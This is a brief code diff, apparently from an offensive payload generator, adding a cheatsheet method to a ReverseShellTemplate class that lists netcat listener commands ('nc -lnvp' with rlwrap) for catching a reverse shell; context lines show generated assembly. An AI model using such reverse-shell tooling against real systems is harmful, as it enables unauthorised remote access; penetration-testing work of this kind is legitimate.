@@ -104,3 +104,9 @@ class ReverseShellTemplate(PayloadTemplate):
             f"    call dword ptr {cpa}",
             "",
         ])
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Start netcat listener", f"nc -lnvp {config.lport}"),
+            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
+        ]
